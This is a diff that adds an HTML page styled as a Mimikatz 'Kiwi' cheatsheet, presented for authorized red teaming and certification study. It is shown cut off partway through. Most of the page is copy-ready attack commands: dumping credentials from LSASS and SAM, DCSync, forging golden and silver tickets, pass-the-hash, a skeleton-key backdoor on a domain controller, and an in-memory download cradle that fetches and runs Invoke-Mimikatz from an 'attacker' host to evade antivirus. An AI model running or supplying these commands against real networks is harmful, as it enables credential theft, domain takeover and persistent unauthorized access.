@@ -1,0 +1,1049 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mimikatz Cheatsheet 🥝</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Nunito:wght@400;600;700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --kiwi-green: #5d8a3c;
+    --kiwi-light: #8fbf5a;
+    --kiwi-bright: #b8e062;
+    --kiwi-skin: #c8a96e;
+    --kiwi-flesh: #e8d5a3;
+    --kiwi-seed: #2c1a0e;
+    --kiwi-bg: #0f1a0a;
+    --kiwi-surface: #1a2d12;
+    --kiwi-surface2: #243d18;
+    --kiwi-border: #3a5a28;
+    --text-main: #d4e8b0;
+    --text-muted: #8aab6a;
+    --text-code: #b8e062;
+    --accent-orange: #e8832a;
+    --accent-yellow: #f0c040;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--kiwi-bg);
+    color: var(--text-main);
+    font-family: 'Nunito', sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Animated kiwi slice background */
+  body::before {
+    content: '';
+    position: fixed;
+    top: -50%;
+    right: -20%;
+    width: 600px;
+    height: 600px;
+    border-radius: 50%;
+    background: radial-gradient(circle at 50% 50%,
+      transparent 0%,
+      transparent 28%,
+      var(--kiwi-seed) 28%,
+      var(--kiwi-seed) 32%,
+      var(--kiwi-flesh) 32%,
+      var(--kiwi-flesh) 65%,
+      var(--kiwi-green) 65%,
+      var(--kiwi-green) 75%,
+      var(--kiwi-skin) 75%,
+      var(--kiwi-skin) 100%
+    );
+    opacity: 0.06;
+    animation: slowRotate 40s linear infinite;
+    z-index: 0;
+  }
+
+  body::after {
+    content: '';
+    position: fixed;
+    bottom: -30%;
+    left: -10%;
+    width: 400px;
+    height: 400px;
+    border-radius: 50%;
+    background: radial-gradient(circle at 50% 50%,
+      transparent 0%,
+      transparent 28%,
+      var(--kiwi-seed) 28%,
+      var(--kiwi-seed) 32%,
+      var(--kiwi-flesh) 32%,
+      var(--kiwi-flesh) 65%,
+      var(--kiwi-green) 65%,
+      var(--kiwi-green) 75%,
+      var(--kiwi-skin) 75%,
+      var(--kiwi-skin) 100%
+    );
+    opacity: 0.04;
+    animation: slowRotate 60s linear infinite reverse;
+    z-index: 0;
+  }
+
+  @keyframes slowRotate {
+    from { transform: rotate(0deg); }
+    to { transform: rotate(360deg); }
+  }
+
+  /* Seed pattern lines radiating from kiwi */
+  .seed-line {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background-image: 
+      repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 80px,
+        rgba(93,138,60,0.03) 80px,
+        rgba(93,138,60,0.03) 81px
+      );
+    z-index: 0;
+    pointer-events: none;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 20px;
+  }
+
+  /* Header */
+  header {
+    text-align: center;
+    padding: 50px 20px 40px;
+    position: relative;
+  }
+
+  .kiwi-emoji-row {
+    font-size: 2rem;
+    letter-spacing: 8px;
+    margin-bottom: 16px;
+    animation: bounce 2s ease-in-out infinite;
+  }
+
+  @keyframes bounce {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-6px); }
+  }
+
+  header h1 {
+    font-family: 'Nunito', sans-serif;
+    font-weight: 900;
+    font-size: clamp(2rem, 5vw, 3.5rem);
+    color: var(--kiwi-bright);
+    text-shadow: 0 0 40px rgba(184,224,98,0.4);
+    letter-spacing: -1px;
+  }
+
+  header h1 span {
+    color: var(--kiwi-skin);
+  }
+
+  header p {
+    margin-top: 12px;
+    color: var(--text-muted);
+    font-size: 1rem;
+    font-weight: 600;
+  }
+
+  .badge {
+    display: inline-block;
+    background: var(--kiwi-surface2);
+    border: 1px solid var(--kiwi-border);
+    color: var(--kiwi-bright);
+    font-size: 0.7rem;
+    font-weight: 700;
+    padding: 3px 10px;
+    border-radius: 20px;
+    margin: 4px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  /* Search */
+  .search-wrap {
+    max-width: 500px;
+    margin: 20px auto 30px;
+    position: relative;
+  }
+
+  .search-wrap input {
+    width: 100%;
+    background: var(--kiwi-surface);
+    border: 2px solid var(--kiwi-border);
+    color: var(--text-main);
+    font-family: 'Space Mono', monospace;
+    font-size: 0.85rem;
+    padding: 12px 16px 12px 44px;
+    border-radius: 12px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+
+  .search-wrap input:focus {
+    border-color: var(--kiwi-light);
+  }
+
+  .search-wrap input::placeholder { color: var(--text-muted); }
+
+  .search-icon {
+    position: absolute;
+    left: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 1rem;
+  }
+
+  /* Nav tabs */
+  .nav-tabs {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    justify-content: center;
+    margin-bottom: 30px;
+  }
+
+  .tab-btn {
+    background: var(--kiwi-surface);
+    border: 1.5px solid var(--kiwi-border);
+    color: var(--text-muted);
+    font-family: 'Nunito', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    padding: 8px 16px;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: all 0.2s;
+    letter-spacing: 0.5px;
+  }
+
+  .tab-btn:hover, .tab-btn.active {
+    background: var(--kiwi-green);
+    border-color: var(--kiwi-light);
+    color: #fff;
+  }
+
+  .tab-btn.active {
+    box-shadow: 0 0 16px rgba(93,138,60,0.5);
+  }
+
+  /* Section */
+  .section {
+    margin-bottom: 32px;
+    display: none;
+  }
+
+  .section.visible {
+    display: block;
+    animation: fadeIn 0.3s ease;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .section-title {
+    font-weight: 900;
+    font-size: 1.2rem;
+    color: var(--kiwi-bright);
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .section-title::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(to right, var(--kiwi-border), transparent);
+  }
+
+  /* Cards grid */
+  .cards {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(480px, 1fr));
+    gap: 16px;
+  }
+
+  .card {
+    background: var(--kiwi-surface);
+    border: 1.5px solid var(--kiwi-border);
+    border-radius: 14px;
+    overflow: hidden;
+    transition: border-color 0.2s, transform 0.2s;
+  }
+
+  .card:hover {
+    border-color: var(--kiwi-light);
+    transform: translateY(-2px);
+  }
+
+  .card-header {
+    background: var(--kiwi-surface2);
+    padding: 10px 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .card-title {
+    font-weight: 700;
+    font-size: 0.85rem;
+    color: var(--kiwi-bright);
+    flex: 1;
+  }
+
+  .card-tag {
+    font-size: 0.65rem;
+    font-weight: 700;
+    padding: 2px 8px;
+    border-radius: 20px;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+  }
+
+  .tag-cred { background: rgba(232,131,42,0.2); color: var(--accent-orange); }
+  .tag-kerb { background: rgba(184,224,98,0.15); color: var(--kiwi-bright); }
+  .tag-priv { background: rgba(240,192,64,0.2); color: var(--accent-yellow); }
+  .tag-util { background: rgba(93,138,60,0.3); color: var(--kiwi-light); }
+  .tag-pth  { background: rgba(255,80,80,0.2); color: #ff8080; }
+  .tag-misc { background: rgba(143,191,90,0.15); color: var(--kiwi-light); }
+
+  .card-body {
+    padding: 12px 14px;
+  }
+
+  .cmd-block {
+    background: var(--kiwi-bg);
+    border: 1px solid var(--kiwi-border);
+    border-radius: 8px;
+    padding: 10px 12px;
+    margin: 6px 0;
+    font-family: 'Space Mono', monospace;
+    font-size: 0.78rem;
+    color: var(--text-code);
+    position: relative;
+    cursor: pointer;
+    transition: background 0.15s;
+    word-break: break-all;
+  }
+
+  .cmd-block:hover { background: var(--kiwi-surface2); }
+
+  .cmd-block .copy-hint {
+    position: absolute;
+    top: 6px;
+    right: 8px;
+    font-size: 0.65rem;
+    color: var(--text-muted);
+    opacity: 0;
+    transition: opacity 0.2s;
+  }
+
+  .cmd-block:hover .copy-hint { opacity: 1; }
+
+  .cmd-block .copied {
+    color: var(--kiwi-bright);
+  }
+
+  .cmd-desc {
+    font-size: 0.78rem;
+    color: var(--text-muted);
+    margin: 4px 0 8px;
+    line-height: 1.5;
+  }
+
+  .cmd-block .kw { color: var(--kiwi-light); }
+  .cmd-block .op { color: var(--kiwi-skin); }
+  .cmd-block .str { color: var(--accent-orange); }
+  .cmd-block .flag { color: var(--accent-yellow); }
+  .cmd-block .comment { color: #4a6640; }
+
+  /* Warning banner */
+  .warning {
+    background: rgba(240,192,64,0.08);
+    border: 1px solid rgba(240,192,64,0.3);
+    border-radius: 10px;
+    padding: 12px 16px;
+    font-size: 0.8rem;
+    color: var(--accent-yellow);
+    margin-bottom: 24px;
+    text-align: center;
+  }
+
+  /* Footer */
+  footer {
+    text-align: center;
+    padding: 30px;
+    color: var(--text-muted);
+    font-size: 0.75rem;
+    border-top: 1px solid var(--kiwi-border);
+    margin-top: 40px;
+  }
+
+  .kiwi-divider {
+    text-align: center;
+    color: var(--kiwi-border);
+    font-size: 1.2rem;
+    letter-spacing: 6px;
+    margin: 10px 0;
+  }
+
+  @media (max-width: 600px) {
+    .cards { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+<div class="seed-line"></div>
+<div class="wrapper">
+
+<header>
+  <div class="kiwi-emoji-row">🥝 🔐 🥝 🔐 🥝</div>
+  <h1>Mimikatz <span>/ Kiwi</span> Cheatsheet</h1>
+  <p>Credential extraction & post-exploitation reference for authorized red team ops</p>
+  <div style="margin-top:12px;">
+    <span class="badge">CRTP</span>
+    <span class="badge">Active Directory</span>
+    <span class="badge">Red Team</span>
+    <span class="badge">Pentest</span>
+  </div>
+</header>
+
+<div class="warning">
+  ⚠️ For authorized security testing, CTF, and certification study (CRTP/OSCP) only. Always obtain written permission before testing.
+</div>
+
+<div class="search-wrap">
+  <span class="search-icon">🔍</span>
+  <input type="text" id="searchBox" placeholder="Search commands, modules, flags..." oninput="filterCards()">
+</div>
+
+<div class="nav-tabs">
+  <button class="tab-btn active" onclick="showTab('all', this)">🥝 All</button>
+  <button class="tab-btn" onclick="showTab('startup', this)">⚡ Startup</button>
+  <button class="tab-btn" onclick="showTab('creds', this)">🔑 Credentials</button>
+  <button class="tab-btn" onclick="showTab('kerb', this)">🎫 Kerberos</button>
+  <button class="tab-btn" onclick="showTab('pth', this)">👤 Pass-the-*</button>
+  <button class="tab-btn" onclick="showTab('priv', this)">⚠️ Privilege</button>
+  <button class="tab-btn" onclick="showTab('lsadump', this)">💾 LSA Dump</button>
+  <button class="tab-btn" onclick="showTab('meterp', this)">🐚 Meterpreter</button>
+</div>
+
+<!-- STARTUP -->
+<div class="section visible" data-tab="startup">
+  <div class="section-title">⚡ Startup & Basics</div>
+  <div class="cards">
+
+    <div class="card" data-search="startup privilege debug token invoke">
+      <div class="card-header">
+        <span class="card-title">Initial Setup</span>
+        <span class="card-tag tag-util">Setup</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Launch mimikatz and enable SeDebugPrivilege (needed for most operations)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">mimikatz.exe</span> <span class="comment"># Run as Administrator</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">privilege</span>::<span class="op">debug</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Should return "Privilege '20' OK" — required for LSASS access</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">token</span>::<span class="op">elevate</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Impersonate SYSTEM token for highest privilege level</p>
+      </div>
+    </div>
+
+    <div class="card" data-search="log output file log">
+      <div class="card-header">
+        <span class="card-title">Logging & Output</span>
+        <span class="card-tag tag-util">Utility</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Save all output to a file</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">log</span> <span class="str">C:\Windows\Temp\mimi.log</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Run silently and dump everything to a file (one-liner)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">mimikatz.exe</span> <span class="str">"privilege::debug"</span> <span class="str">"sekurlsa::logonpasswords"</span> <span class="str">"exit"</span> <span class="flag">> out.txt</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Version info</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">version</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" data-search="powershell invoke-mimikatz remote cradle">
+      <div class="card-header">
+        <span class="card-title">PowerShell / Invoke-Mimikatz</span>
+        <span class="card-tag tag-util">Remote</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Load via PowerSploit (in-memory, AV evasion)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">iex</span> (<span class="op">New-Object</span> Net.WebClient).<span class="op">DownloadString</span>(<span class="str">'http://attacker/Invoke-Mimikatz.ps1'</span>)
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">Invoke-Mimikatz</span> <span class="flag">-DumpCreds</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Dump creds on a remote host</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">Invoke-Mimikatz</span> <span class="flag">-DumpCreds</span> <span class="flag">-ComputerName</span> <span class="str">dc01,web01</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- CREDENTIALS -->
+<div class="section visible" data-tab="creds">
+  <div class="section-title">🔑 Credential Dumping (sekurlsa)</div>
+  <div class="cards">
+
+    <div class="card" data-search="sekurlsa logonpasswords plaintext ntlm wdigest">
+      <div class="card-header">
+        <span class="card-title">Logon Passwords</span>
+        <span class="card-tag tag-cred">Creds</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Dump all logon session credentials (NTLM hashes + plaintext if available)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">sekurlsa</span>::<span class="op">logonpasswords</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Dump only NTLM hashes (less noisy)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">sekurlsa</span>::<span class="op">msv</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Dump WDigest credentials (plaintext — requires registry patch on newer OS)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">sekurlsa</span>::<span class="op">wdigest</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" data-search="sekurlsa minidump lsass dmp offline">
+      <div class="card-header">
+        <span class="card-title">Offline LSASS Dump</span>
+        <span class="card-tag tag-cred">Creds</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Create LSASS dump with Task Manager / procdump (external)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">.\procdump.exe</span> <span class="flag">-accepteula</span> <span class="flag">-ma</span> <span class="op">lsass.exe</span> <span class="str">lsass.dmp</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Then parse the dump offline with mimikatz</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">sekurlsa</span>::<span class="op">minidump</span> <span class="str">lsass.dmp</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">sekurlsa</span>::<span class="op">logonpasswords</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" data-search="sekurlsa kerberos tickets tgt tgs">
+      <div class="card-header">
+        <span class="card-title">Kerberos Tickets from Memory</span>
+        <span class="card-tag tag-kerb">Kerberos</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">List all Kerberos tickets in memory</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">sekurlsa</span>::<span class="op">tickets</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Export all tickets to .kirbi files</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">sekurlsa</span>::<span class="op">tickets</span> <span class="flag">/export</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Dump Kerberos encryption keys</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">sekurlsa</span>::<span class="op">ekeys</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" data-search="vault dpapi credentials saved cred manager">
+      <div class="card-header">
+        <span class="card-title">Vault & DPAPI</span>
+        <span class="card-tag tag-cred">Creds</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">List Windows Vault credentials</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">vault</span>::<span class="op">list</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">vault</span>::<span class="op">cred</span> <span class="flag">/patch</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Decrypt DPAPI master key (requires SID + domain backup key)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">dpapi</span>::<span class="op">masterkey</span> <span class="flag">/in:</span><span class="str">masterkey</span> <span class="flag">/rpc</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- KERBEROS -->
+<div class="section visible" data-tab="kerb">
+  <div class="section-title">🎫 Kerberos Attacks</div>
+  <div class="cards">
+
+    <div class="card" data-search="kerberos golden ticket krbtgt forged">
+      <div class="card-header">
+        <span class="card-title">Golden Ticket</span>
+        <span class="card-tag tag-kerb">Kerberos</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Forge a TGT using the krbtgt NTLM hash — persists even after password changes</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">kerberos</span>::<span class="op">golden</span> <span class="flag">/user:</span><span class="str">Administrator</span> <span class="flag">/domain:</span><span class="str">domain.local</span> <span class="flag">/sid:</span><span class="str">S-1-5-21-...</span> <span class="flag">/krbtgt:</span><span class="str">NTLMHASH</span> <span class="flag">/id:</span><span class="str">500</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">With AES256 key (stealthier, preferred)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">kerberos</span>::<span class="op">golden</span> <span class="flag">/user:</span><span class="str">Administrator</span> <span class="flag">/domain:</span><span class="str">domain.local</span> <span class="flag">/sid:</span><span class="str">S-1-5-21-...</span> <span class="flag">/aes256:</span><span class="str">AES256KEY</span> <span class="flag">/startoffset:</span><span class="str">0</span> <span class="flag">/endin:</span><span class="str">600</span> <span class="flag">/renewmax:</span><span class="str">10080</span> <span class="flag">/ptt</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc"><code>/ptt</code> = pass-the-ticket (inject directly); <code>/ticket:gold.kirbi</code> = save to file</p>
+      </div>
+    </div>
+
+    <div class="card" data-search="silver ticket service tgs spn forged">
+      <div class="card-header">
+        <span class="card-title">Silver Ticket</span>
+        <span class="card-tag tag-kerb">Kerberos</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Forge a TGS for a specific service using the service account NTLM hash</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">kerberos</span>::<span class="op">golden</span> <span class="flag">/user:</span><span class="str">Administrator</span> <span class="flag">/domain:</span><span class="str">domain.local</span> <span class="flag">/sid:</span><span class="str">S-1-5-21-...</span> <span class="flag">/target:</span><span class="str">server.domain.local</span> <span class="flag">/service:</span><span class="str">cifs</span> <span class="flag">/rc4:</span><span class="str">SERVICEHASH</span> <span class="flag">/ptt</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Common services: <code>cifs</code> (SMB), <code>host</code>, <code>http</code>, <code>ldap</code>, <code>mssql</code>, <code>wsman</code></p>
+      </div>
+    </div>
+
+    <div class="card" data-search="diamond ticket ptt pass ticket inject kirbi">
+      <div class="card-header">
+        <span class="card-title">Pass-the-Ticket</span>
+        <span class="card-tag tag-kerb">Kerberos</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Inject a .kirbi ticket into current session</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">kerberos</span>::<span class="op">ptt</span> <span class="str">ticket.kirbi</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Inject all .kirbi files from a directory</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">kerberos</span>::<span class="op">ptt</span> <span class="str">C:\tickets\</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">List, purge current tickets</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">kerberos</span>::<span class="op">list</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">kerberos</span>::<span class="op">purge</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" data-search="skeleton key backdoor authentication patch master password">
+      <div class="card-header">
+        <span class="card-title">Skeleton Key</span>
+        <span class="card-tag tag-kerb">Persistence</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Patch LSASS on DC to accept "mimikatz" as universal password (in-memory, non-persistent)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">misc</span>::<span class="op">skeleton</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Then log in with <code>mimikatz</code> as password for any domain account</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          net use \\dc01\admin$ <span class="str">/user:domain\Administrator mimikatz</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- PASS-THE -->
+<div class="section visible" data-tab="pth">
+  <div class="section-title">👤 Pass-the-Hash / Pass-the-Key</div>
+  <div class="cards">
+
+    <div class="card" data-search="pass hash pth ntlm sekurlsa spawn">
+      <div class="card-header">
+        <span class="card-title">Pass-the-Hash (PtH)</span>
+        <span class="card-tag tag-pth">PtH</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Spawn a process using NTLM hash — no plaintext needed</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">sekurlsa</span>::<span class="op">pth</span> <span class="flag">/user:</span><span class="str">Administrator</span> <span class="flag">/domain:</span><span class="str">domain.local</span> <span class="flag">/ntlm:</span><span class="str">NTLMHASH</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Spawn specific process with hash</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">sekurlsa</span>::<span class="op">pth</span> <span class="flag">/user:</span><span class="str">Administrator</span> <span class="flag">/domain:</span><span class="str">WORKGROUP</span> <span class="flag">/ntlm:</span><span class="str">HASH</span> <span class="flag">/run:</span><span class="str">cmd.exe</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" data-search="pass key aes overpass the hash kerberos">
+      <div class="card-header">
+        <span class="card-title">Overpass-the-Hash (Pass-the-Key)</span>
+        <span class="card-tag tag-pth">PtK</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Convert NTLM hash or AES key into a Kerberos TGT</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">sekurlsa</span>::<span class="op">pth</span> <span class="flag">/user:</span><span class="str">Administrator</span> <span class="flag">/domain:</span><span class="str">domain.local</span> <span class="flag">/aes256:</span><span class="str">AES256KEY</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Or use NTLM + AES keys together</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">sekurlsa</span>::<span class="op">pth</span> <span class="flag">/user:</span><span class="str">user</span> <span class="flag">/domain:</span><span class="str">domain.local</span> <span class="flag">/ntlm:</span><span class="str">HASH</span> <span class="flag">/aes256:</span><span class="str">AES</span> <span class="flag">/run:</span><span class="str">powershell.exe</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- PRIVILEGE -->
+<div class="section visible" data-tab="priv">
+  <div class="section-title">⚠️ Privilege Escalation & Token</div>
+  <div class="cards">
+
+    <div class="card" data-search="token elevate impersonate whoami system">
+      <div class="card-header">
+        <span class="card-title">Token Manipulation</span>
+        <span class="card-tag tag-priv">Priv</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Elevate to SYSTEM via token impersonation</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">token</span>::<span class="op">elevate</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Elevate using domain admin token if available</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">token</span>::<span class="op">elevate</span> <span class="flag">/domainadmin</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">List all available tokens</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">token</span>::<span class="op">list</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Revert to original token</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">token</span>::<span class="op">revert</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Impersonate specific user token</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">token</span>::<span class="op">impersonate</span> <span class="flag">/user:</span><span class="str">DOMAIN\user</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" data-search="privilege debug enable all rights">
+      <div class="card-header">
+        <span class="card-title">Privilege Management</span>
+        <span class="card-tag tag-priv">Priv</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Enable SeDebugPrivilege</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">privilege</span>::<span class="op">debug</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Enable all privileges in current token</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">privilege</span>::<span class="op">all</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Enable specific privilege by name</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">privilege</span>::<span class="op">name</span> <span class="str">SeDebugPrivilege</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- LSA DUMP -->
+<div class="section visible" data-tab="lsadump">
+  <div class="section-title">💾 LSA Dump & SAM</div>
+  <div class="cards">
+
+    <div class="card" data-search="lsadump dcsync dc domain controller ntds secretsdump">
+      <div class="card-header">
+        <span class="card-title">DCSync Attack</span>
+        <span class="card-tag tag-pth">DCSync</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Simulate DC replication to extract NTLM hashes — no LSASS access needed</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">lsadump</span>::<span class="op">dcsync</span> <span class="flag">/domain:</span><span class="str">domain.local</span> <span class="flag">/user:</span><span class="str">Administrator</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Dump ALL domain hashes (krbtgt + all users)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">lsadump</span>::<span class="op">dcsync</span> <span class="flag">/domain:</span><span class="str">domain.local</span> <span class="flag">/all</span> <span class="flag">/csv</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Dump krbtgt specifically (needed for Golden Ticket)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">lsadump</span>::<span class="op">dcsync</span> <span class="flag">/domain:</span><span class="str">domain.local</span> <span class="flag">/user:</span><span class="str">krbtgt</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" data-search="lsadump lsa sam local secrets patch">
+      <div class="card-header">
+        <span class="card-title">Local SAM & LSA Secrets</span>
+        <span class="card-tag tag-cred">Local</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Dump local SAM database (local accounts)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">lsadump</span>::<span class="op">sam</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
